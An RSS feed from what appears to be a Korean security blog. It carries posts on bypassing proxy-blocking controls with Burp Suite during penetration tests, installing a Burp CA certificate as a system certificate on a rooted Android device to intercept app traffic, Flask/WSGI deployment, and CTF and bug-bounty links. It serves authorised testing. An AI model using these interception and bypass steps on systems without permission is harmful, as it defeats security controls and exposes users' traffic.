<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>JHYEON</title>
    <link>https://blog.jhyeon.dev/</link>
    
    <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>JHYEON BLOG</description>
    <pubDate>Tue, 25 May 2021 01:30:00 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Proxy Bypass Technologies</title>
      <link>https://blog.jhyeon.dev/2021/05/25/proxybypass-210525/</link>
      <guid>https://blog.jhyeon.dev/2021/05/25/proxybypass-210525/</guid>
      <pubDate>Tue, 25 May 2021 01:30:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;이번 글에서는 웹 프록시 도구로 취약점을 진단할 때 이러한 프록시 설정이 차단되어 있을 경우를 가정하여&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>이번 글에서는 웹 프록시 도구로 취약점을 진단할 때 이러한 프록시 설정이 차단되어 있을 경우를 가정하여</p><p>우회하는 방법 몇 가지를 작성해보고자 합니다.</p><h3 id="Bypass-1"><a href="#Bypass-1" class="headerlink" title="Bypass-1"></a>Bypass-1</h3><p>첫 번째로 Burp Suite 프록시 도구를 통해 진단을 하는 경우에는 <code>Request Handling</code> 기능을 사용할 수 있습니다.</p><p>Proxy 기본 설정 옵션에 존재하며 해당 기능을 사용하면 예를 들어 jhyeon.com 으로 요청을 했을 때 Redirection</p><p>과정을 거쳐 타겟(대상) URL로 이동하기 때문에 프록시 차단 솔루션이 브라우저를 향해 바라보고 있다면 이러한</p><p>요청 처리(Request Handling)을 통해 프록시 차단 우회가 가능합니다.</p><p>설정 방법은 다음과 같습니다.</p><p><img src="/img/post/proxybypass/1.png" class="lazyload" data-srcset="/img/post/proxybypass/1.png" srcset="data:image/png;base64,666" alt="photo1"></p><p>Burp Suite - Proxy - Options - Proxy Listeners 탭에서 기존에 설정된 프록시 설정을</p><p>편집(Edit)모드로 들어가 Request Handling 설정을 하면 됩니다. 이 때 Redirect to Host 값에는</p><p>프록시을 우회하고 들어갈 타겟(대상) URL을 입력해주신 뒤 저장을 하시고,</p><p><img src="/img/post/proxybypass/2.png" class="lazyload" data-srcset="/img/post/proxybypass/2.png" srcset="data:image/png;base64,666" alt="photo2"></p><p>아래 Match and Replace 옵션에서 Host Header 값을 사진과 같이 설정해주셔야 합니다.</p><p>Match에는 임의로 접속할 URL주소, Replace에는 변경할 헤더 즉, 타겟(대상) URL 주소가 됩니다.</p><h3 id="Bypass-2"><a href="#Bypass-2" class="headerlink" title="Bypass-2"></a>Bypass-2</h3><p>두 번째 방법은 흔히 알려진 Burp Suite, Fiddler가 아니더라도 크롬 확장 프로그램에 존재하는</p><p>Proxy SwiftOmega 도구를 사용하는 것입니다. 이를 활용하여 Burp Suite 프록시 설정과 동일하게 세팅하여</p><p>브라우저 패킷을 볼 수 있습니다.</p><p>다운로드 : <a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif">Chrome Store</a></p><p><img src="/img/post/proxybypass/3.png" class="lazyload" data-srcset="/img/post/proxybypass/3.png" srcset="data:image/png;base64,666" alt="photo3"></p><p>이외에도 여러 다양한 방법이 있겠지만 추가적으로 연구해보다가 좋은 방안이 있으면 포스팅 할 예정입니다.</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://normaltic.com/%EC%95%88%EB%9E%A9%EC%9C%BC%EB%A1%9C-%EB%B6%80%ED%84%B0-%EB%8B%B9%EB%8B%B9%ED%95%98%EC%9E%90-%EC%9A%B0%ED%9A%8C-%EA%B8%B0%EC%88%A0-astx-e2e-bypass/">ASTX E2E Bypass</a></li></ul>]]></content:encoded>
      
      
      
      <category domain="https://blog.jhyeon.dev/tags/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/">모의해킹</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%9B%B9-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/">웹 모의해킹</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%9B%B9-%ED%95%B4%ED%82%B9/">웹 해킹</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Burp-Suite/">Burp Suite</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Fiddler/">Fiddler</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Proxy/">Proxy</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Proxy-Bypass/">Proxy Bypass</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/05/25/proxybypass-210525/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>(삼성SDS) 해킹존 버그바운티 리뷰</title>
      <link>https://blog.jhyeon.dev/2021/05/21/hackingzone-210521/</link>
      <guid>https://blog.jhyeon.dev/2021/05/21/hackingzone-210521/</guid>
      <pubDate>Thu, 20 May 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;해킹존이란&quot;&gt;&lt;a href=&quot;#해킹존이란&quot; class=&quot;headerlink&quot; title=&quot;해킹존이란?&quot;&gt;&lt;/a&gt;해킹존이란?&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://hackingzone.net/&quot;&gt;https://hacking</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="해킹존이란"><a href="#해킹존이란" class="headerlink" title="해킹존이란?"></a>해킹존이란?</h3><ul><li><a href="https://hackingzone.net/">https://hackingzone.net</a></li></ul><p>화이트해커는 서비스의 취약점을 제보하여 보안을 향상시키고, 기업은 제보받은 취약점에 합당한 포상금을 지급합니다.</p><p>라는 의미로 개설된 삼성SDS에서 개발한 국내 버그바운티 플랫폼입니다.</p><h3 id="해킹존-소개"><a href="#해킹존-소개" class="headerlink" title="해킹존 소개"></a>해킹존 소개</h3><p>홈페이지에 들어가셔서 회원가입 절차를 진행해주시면 되며 구글 계정 로그인이 연동되어 있어</p><p>별도 회원가입 양식 필요없이 금방 회원가입이 가능할 겁니다?!</p><p><img src="/img/post/hackingzone/hackingzone.png" class="lazyload" data-srcset="/img/post/hackingzone/hackingzone.png" srcset="data:image/png;base64,666" alt="photo1"></p><p>사이트에 들어가면 이렇게 진행중인 프로그램이 있는데, 각 프로그램 별로 상세 설명도 되어있고</p><p>자체적으로 레포트(제보) 관리가 되고 있어서 보고서를 작성하는 것도 어려운게 없습니다.</p><p>분야는 웹, 모바일, 클라이언트(S/W)가 있으니 관심있으시다면 한번 해보시는 것도 좋을 것 같네요~!</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Memo/">Memo</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/%ED%95%B4%ED%82%B9%EC%A1%B4/">해킹존</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EB%B2%84%EA%B7%B8%EB%B0%94%EC%9A%B4%ED%8B%B0/">버그바운티</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Bug-Bounty/">Bug Bounty</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%82%BC%EC%84%B1SDS/">삼성SDS</category>
      
      <category domain="https://blog.jhyeon.dev/tags/KISA/">KISA</category>
      
      <category domain="https://blog.jhyeon.dev/tags/HackerOne/">HackerOne</category>
      
      <category domain="https://blog.jhyeon.dev/tags/BugCrowd/">BugCrowd</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%9C%EB%B3%B4/">취약점 제보</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/05/21/hackingzone-210521/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Python Flask + WSGI 사용하기</title>
      <link>https://blog.jhyeon.dev/2021/05/21/flask-apache-210521/</link>
      <guid>https://blog.jhyeon.dev/2021/05/21/flask-apache-210521/</guid>
      <pubDate>Thu, 20 May 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;이번 글에서는 Python Flask 환경에서 WSGI를 사용해 Apache2 웹 서버 엔진과 연동하는&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>이번 글에서는 Python Flask 환경에서 WSGI를 사용해 Apache2 웹 서버 엔진과 연동하는</p><p>방법에 대해서 글을 작성해보고자 한다.</p><h2 id="WSGI란"><a href="#WSGI란" class="headerlink" title="WSGI란?"></a>WSGI란?</h2><p>WSGI(Web Server Gateway Interface)로 파이썬에서 웹 어플리케이션이 서버와 통신하기 위한 인터페이스를 의미한다.</p><p>즉, 웹 서버가 받은 요청을 Python Application 으로 넘겨주고 응답을 반환받는 호출 조약(Calling Converstation)이다.</p><h2 id="WSGI를-왜-사용하는가"><a href="#WSGI를-왜-사용하는가" class="headerlink" title="WSGI를 왜 사용하는가?"></a>WSGI를 왜 사용하는가?</h2><p><img src="/img/post/wsgi/wsgi_browser.jpg" class="lazyload" data-srcset="/img/post/wsgi/wsgi_browser.jpg" srcset="data:image/png;base64,666" alt="photo1"></p><p>Flask 같은 경우 Restful API 서비스에 사용되거나 하는 가장 최소한의 기능들을 포함한 웹 프레임 워크입니다.</p><p>기본적으로 한번에 최대 하나의 요청까지만을 처리하기 때문에 실제 웹 서비스를 배포하는 경우,</p><p>Flask를 단일로 구성해서 배포하는 것은 올바르지 않은 것이고</p><p>주로 WSGI를 사용해서 중간에 웹 서버 엔진(nginx, apache 등)을 경유할 수 있도록 하는 것이 좋습니다.</p><h2 id="WSGI-Middleware"><a href="#WSGI-Middleware" class="headerlink" title="WSGI Middleware"></a>WSGI Middleware</h2><p><img src="/img/post/wsgi/wsgi.png" class="lazyload" data-srcset="/img/post/wsgi/wsgi.png" srcset="data:image/png;base64,666" alt="photo2"></p><p>사진으로 매우 간결하게 정리되어있는데 Private Physical Server 위에 그려진 모든 내용을</p><p>WAS(Web Application Server)라고 명칭합니다.</p><p>그리고 WSGI Module, Process를 합쳐서 <code>WSGI Middleware</code> 라고 부르게 되고 WSGI 전용 프로토콜을 사용합니다.</p><p>이러한 WSGI Middleware는 웹 서버(Web Server)와 어플리케이션(Application)을 서로 연결시켜주는 역할을 합니다.</p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>이번 글에서는 flask+uwsgi+nginx를 사용한 웹 어플리케이션 구동 과정과,</p><p>flask+wsgi+apache2를 사용한 구동 과정을 정리할 것이다.</p><h3 id="NGINX"><a href="#NGINX" class="headerlink" title="NGINX"></a>NGINX</h3><p>예전에는 uwsgi를 통해 직접 nginx 환경을 세팅해야 했지만 요즘에는 <code>docker</code>를 통해서</p><p>flask+uwsgi+nginx 패키지를 묶어둔 도커 이미지가 있기 때문에 사용이 조금 더 편리해진 감이 있다.</p><p>(<a href="https://hub.docker.com/r/tiangolo/uwsgi-nginx-flask">https://hub.docker.com/r/tiangolo/uwsgi-nginx-flask</a>)</p><p>우선 파일 트리는 다음 사진과 같다.</p><p><img src="/img/post/wsgi/nginx_tree.png" class="lazyload" data-srcset="/img/post/wsgi/nginx_tree.png" srcset="data:image/png;base64,666" alt="photo3"></p><p>프로젝트 폴더(NGINX)에 dockerfile, docker-compose.yml 파일을 두고</p><p>web 폴더를 하나 생성해서 실제 flask 앱을 구동할 파일들을 넣어줬다.</p><p><code>dockerfile</code></p><pre><code class="docker">FROM tiangolo/uwsgi-nginx-flask:python3.8COPY ./web /app</code></pre><p><code>docker-compose.yml</code></p><pre><code class="docker">version: &#39;3.7&#39;services:    nginx-wsgi:        build: ./        container_name: nginx-wsgi        ports:            - 80:80</code></pre><p><code>main.py</code></p><pre><code class="py">from flask import Flaskapp = Flask(__name__)@app.route(&#39;/&#39;, methods=[&quot;GET&quot;])def index():    return &#39;hello world!&#39;if __name__ == &quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;, port=80, debug=False)</code></pre><p>이렇게 구성해주고 아래 명령어로 도커 이미지를 빌드시키면 된다.</p><p><code>docker-compose up -d --build</code></p><p><img src="/img/post/wsgi/nginx_run.png" class="lazyload" data-srcset="/img/post/wsgi/nginx_run.png" srcset="data:image/png;base64,666" alt="photo4"></p><h3 id="Apache2"><a href="#Apache2" class="headerlink" title="Apache2"></a>Apache2</h3><p><img src="/img/post/wsgi/apache2_tree.png" class="lazyload" data-srcset="/img/post/wsgi/apache2_tree.png" srcset="data:image/png;base64,666" alt="photo5"></p><p>Apache2도 그렇게 복잡하진 않다. 환경에 맞게 wsgi 설정을 해주면 된다.</p><p>프로젝트 폴더(APACHE2)에 dockerfile, docker-compose.yml, apache2.conf, requirements.txt, run.wsgi 파일을 두고,</p><p>web 폴더를 하나 생성해서 실제 flask 앱을 구동할 파일들을 넣어줬다.</p><p><code>dockerfile</code></p><pre><code class="docker">FROM ubuntu:latestMAINTAINER jhyeon &lt;stjhyeon@kakao.com&gt;ENV DEBIAN_FRONTEND=noninteractiveRUN apt-get update &amp;&amp; apt-get install -y apache2 \    libapache2-mod-wsgi-py3 \    build-essential \    python3 \    python3-dev \    python3-pip \    &amp;&amp; apt-get clean -y \    &amp;&amp; apt-get autoremove -y \    &amp;&amp; rm -rf /var/lib/apt/lists/*WORKDIR /var/www/appCOPY ./requirements.txt /var/www/app/RUN pip install --no-cache-dir -r requirements.txtCOPY ./apache2.conf /etc/apache2/sites-available/apache2.confCOPY ./run.wsgi /var/www/app/COPY ./web/serve.py /var/www/app/serve.pyRUN a2dissite 000-default.confRUN a2ensite apache2.confEXPOSE 80CMD [&quot;/usr/sbin/apache2ctl&quot;, &quot;-D&quot;, &quot;FOREGROUND&quot;]</code></pre><p><code>docker-compose.yml</code></p><pre><code class="docker">version: &#39;3.7&#39;services:    apache2-wsgi:        build: ./        container_name: apache2-wsgi        working_dir: /var/www/app        ports:            - 80:80</code></pre><p><code>apache2.conf</code></p><pre><code>&lt;VirtualHost *:80&gt;        WSGIDaemonProcess app user=www-data group=www-data processes=10 threads=5        WSGIProcessGroup app        WSGIScriptAlias / /var/www/app/run.wsgi        &lt;Directory /var/www/app&gt;            WSGIProcessGroup app            WSGIApplicationGroup %&#123;GLOBAL&#125;            Order deny,allow            Allow from all        &lt;/Directory&gt;        # static linked        Alias /static /var/www/app/static        &lt;Directory /var/www/app/static/&gt;            Order allow,deny            Allow from all        &lt;/Directory&gt;        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined&lt;/VirtualHost&gt;</code></pre><p><code>requirements.txt</code></p><pre><code class="py">Flask</code></pre><p><code>run.wsgi</code></p><pre><code class="py">#! /usr/bin/python3import syssys.path.insert(0, &#39;/var/www/app&#39;)from serve import app as application</code></pre><p><img src="/img/post/wsgi/apache2_run.png" class="lazyload" data-srcset="/img/post/wsgi/apache2_run.png" srcset="data:image/png;base64,666" alt="photo6"></p><h3 id="Download-Git"><a href="#Download-Git" class="headerlink" title="Download(Git)"></a>Download(Git)</h3><p>위에서 작업한 내용들은 모두 아래 깃허브에 저장되어 있으니 직접 보고 구성하셔도 됩니다.</p><ul><li><a href="https://github.com/jhye0n/python-wsgi">https://github.com/jhye0n/python-wsgi</a></li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://velog.io/@misun9283/WSGI-%EB%9E%80">1. WSGI란?</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Development/">Development</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Flask/">Flask</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Apache2/">Apache2</category>
      
      <category domain="https://blog.jhyeon.dev/tags/WSGI/">WSGI</category>
      
      <category domain="https://blog.jhyeon.dev/tags/uWSGI/">uWSGI</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/05/21/flask-apache-210521/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>주요통신기반시설 기술 취약점 분석 가이드(2021-03)</title>
      <link>https://blog.jhyeon.dev/2021/05/19/kisareport-210519/</link>
      <guid>https://blog.jhyeon.dev/2021/05/19/kisareport-210519/</guid>
      <pubDate>Wed, 19 May 2021 02:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;2021.3월에 업데이트 된 KISA 주통기 기반 기술 취약점 분석 가이드 자료를 공유합니다.&lt;/p&gt;
&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>2021.3월에 업데이트 된 KISA 주통기 기반 기술 취약점 분석 가이드 자료를 공유합니다.</p><p>모의 해킹이나 취약점 점검할 때 도움이 되는 자료입니다 ~~</p><ul><li><a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=&SV=">공식 홈페이지 다운로드</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/KISA/">KISA</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%ED%95%9C%EA%B5%AD%EC%9D%B8%ED%84%B0%EB%84%B7%EC%A7%84%ED%9D%A5%EC%9B%90/">한국인터넷진흥원</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EA%B8%B0%EC%88%A0-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D/">기술 취약점 분석</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EA%B8%B0%EC%88%A0-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EA%B0%80%EC%9D%B4%EB%93%9C/">기술 취약점 분석 가이드</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%A3%BC%ED%86%B5%EA%B8%B0-%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B0%80%EC%9D%B4%EB%93%9C/">주통기 취약점 가이드</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/05/19/kisareport-210519/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>dCTF 2021 Write up</title>
      <link>https://blog.jhyeon.dev/2021/05/17/dctf2021-210517/</link>
      <guid>https://blog.jhyeon.dev/2021/05/17/dctf2021-210517/</guid>
      <pubDate>Mon, 17 May 2021 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;dCTF 2021 (5/15 Sat 00:00 ~ 5/17 Mon 06:59 KST)&lt;/p&gt;
&lt;ul&gt;
&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>dCTF 2021 (5/15 Sat 00:00 ~ 5/17 Mon 06:59 KST)</p><ul><li><a href="http://dctf.dragonsec.si/">http://dctf.dragonsec.si/</a></li><li>pwnhub (jhyeon, malhyuk, nga)</li><li>rank : 292th (1250 points)</li></ul><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>해당 게시글은 아래 노션 링크를 통해 확인하실 수 있습니다.</p><ul><li><a href="https://public.jhyeon.dev/ctf/dctf2021">https://public.jhyeon.dev/ctf/dctf2021</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
      
      <category domain="https://blog.jhyeon.dev/tags/dCTF-2021/">dCTF 2021</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/05/17/dctf2021-210517/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Python 비밀키 관리방법(python-decouple)</title>
      <link>https://blog.jhyeon.dev/2021/05/05/python-decouple-210505/</link>
      <guid>https://blog.jhyeon.dev/2021/05/05/python-decouple-210505/</guid>
      <pubDate>Wed, 05 May 2021 01:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;요즘 Python Web Framework(Flask, Django) 실제 웹을 운영할 때도 생각보다 괜</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>요즘 Python Web Framework(Flask, Django) 실제 웹을 운영할 때도 생각보다 괜찮게 잘 되있어서</p><p>실 서비스에도 많이 사용하게 되는 것을 여기저기서 많이 봤다.</p><p>다만 개발할 떄 비밀키라던가 API KEY 등을 코드에 하드코딩을 하면 취약점이 발생했을 때 이러한 키들이</p><p>유출 당할 수 있는 문제점이 있는데 그러한 문제를 막고자 파이썬에서는 <code>decouple</code> 모듈이 있다.</p><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><pre><code class="bash">pip3 install python-decouple</code></pre><h3 id="Apply"><a href="#Apply" class="headerlink" title="Apply"></a>Apply</h3><p><code>settings.ini</code></p><pre><code>[settings]TESTKEY=this_is_test_key</code></pre><p><code>main.py</code></p><pre><code class="py">#!/usr/bin/python3from decouple import configtest_api_key = config(&quot;TESTKEY&quot;)print(test_api_key)</code></pre><p>여기서 주의할 점은 settings.ini는 main.py 위치에 존재해야 하며,</p><p>git으로 관리시에는 반드시 <code>.gitignore</code> 를 통해서 git에 push 되지 않도록 해야한다.</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://pypi.org/project/python-decouple/">https://pypi.org/project/python-decouple/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Development/">Development</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Python/">Python</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Decouple/">Decouple</category>
      
      <category domain="https://blog.jhyeon.dev/tags/SECRET-KEY/">SECRET_KEY</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/05/05/python-decouple-210505/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Android 7.0 이상의 환경에서 CA 인증서 설치</title>
      <link>https://blog.jhyeon.dev/2021/05/03/android-cert-210503/</link>
      <guid>https://blog.jhyeon.dev/2021/05/03/android-cert-210503/</guid>
      <pubDate>Sun, 02 May 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;안드로이드 빌드 7.0 이상에서 CA(Certificate Authority) 인증서를 설치 할 때,&lt;/</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>안드로이드 빌드 7.0 이상에서 CA(Certificate Authority) 인증서를 설치 할 때,</p><p>사용자 인증서로 설치하게 되면 SSL이 정상적으로 적용되지 않는 문제가 있다.</p><p>Burp Suite의 CA 인증서는 만료기간이 20년 이상의 인증서로 생성되는데,</p><p>Google에서 시스템 인증서는 39개월 이내의 만료기간을 가지기 때문에 정상적으로 동작하지 않는다.</p><p>따라서 7.0 빌드 이상의 환경이라면 시스템 루트 공간에 자격 증명을 만들어줘야 동작하게 되는데</p><p>그 과정을 정리하고자 한다.</p><h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p>인증서는 “Burp Suite”의 <code>cacert.der</code>을 사용할 것이다.</p><ul><li><a href="http://burp/">http://burp</a></li></ul><h3 id="Hash-Extraction"><a href="#Hash-Extraction" class="headerlink" title="Hash Extraction"></a>Hash Extraction</h3><p>위 인증서를 다운로드 받았다면 인증서 변환, 해쉬 값 추출을 진행해야 한다.</p><p>OpenSSL을 사용하여 이 과정 진행이 가능하다.</p><pre><code class="bash">mv cacert.der cacert.ceropenssl x509 -inform DER -in cacert.cer -out cacert.pemopenssl x509 -inform PEM -subject_hash_old -in cacert.pem</code></pre><p>위 세가지 명령어를 입력했다면, 아래와 같은 사진을 확인할 수 있다.</p><p><img src="/img/post/android-cert/1.png" class="lazyload" data-srcset="/img/post/android-cert/1.png" srcset="data:image/png;base64,666" alt="photo1"></p><p>여기서 9a5ba575(hash는 다를 수 있음)를 복사해서 파일명을 <code>해쉬값.0</code> 으로 바꿔준다.</p><pre><code class="bash">mv cacert.pem 9a5ba575.0</code></pre><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><p>이제 해당 인증서를 시스템 CA 인증서 디렉토리에 push 해주면 된다.</p><pre><code class="bash">adb push 9a5ba575.0 /sdcardadb shellsumount -o rw,remount /systemmv /sdcard/9a5ba575.0 /system/etc/security/cacerts/cd /system/etc/security/cacerts/chmod 644 9a5ba575.0</code></pre><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://hackcatml.tistory.com/37">https://hackcatml.tistory.com/37</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
      
      <category domain="https://blog.jhyeon.dev/tags/ADB/">ADB</category>
      
      <category domain="https://blog.jhyeon.dev/tags/SSL/">SSL</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CA-%EC%9D%B8%EC%A6%9D%EC%84%9C/">CA 인증서</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/05/03/android-cert-210503/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>HSPACE (SatunX) CTF 2021 Write Up</title>
      <link>https://blog.jhyeon.dev/2021/04/25/hspacectf-210425/</link>
      <guid>https://blog.jhyeon.dev/2021/04/25/hspacectf-210425/</guid>
      <pubDate>Sun, 25 Apr 2021 03:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/img/post/ctf/hspace2021/logo.png&quot; class=&quot;lazylo</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p><img src="/img/post/ctf/hspace2021/logo.png" class="lazyload" data-srcset="/img/post/ctf/hspace2021/logo.png" srcset="data:image/png;base64,666" alt="photo1"></p><p>HSPACE(SatunX) 2021 (4/24 Sat 10:00 ~ 4/24 Sat 22:00 KST)</p><ul><li><a href="https://ctf.hspace.io/">https://ctf.hspace.io/</a></li><li>rank : 24th (jhye3n)</li></ul><h3 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h3><ul><li><a href="https://public.jhyeon.dev/ctf/hspace2021">https://public.jhyeon.dev/ctf/hspace2021</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Reversing/">Reversing</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Crypto/">Crypto</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Network/">Network</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Mobile/">Mobile</category>
      
      <category domain="https://blog.jhyeon.dev/tags/SatunX/">SatunX</category>
      
      <category domain="https://blog.jhyeon.dev/tags/HSPACE/">HSPACE</category>
      
      <category domain="https://blog.jhyeon.dev/tags/HSPACE-CTF/">HSPACE CTF</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/25/hspacectf-210425/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>모바일 게임 앱 분석(Unity Game Engine)</title>
      <link>https://blog.jhyeon.dev/2021/04/25/unityapp-analysis-210425/</link>
      <guid>https://blog.jhyeon.dev/2021/04/25/unityapp-analysis-210425/</guid>
      <pubDate>Sun, 25 Apr 2021 01:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;분석에 앞서 해당 게시글은 공부용 목적으로 연구된 자료이니, 악용 목적으로는 사용을 금합니다.&lt;/p&gt;
&lt;</description>
        
      
      
      
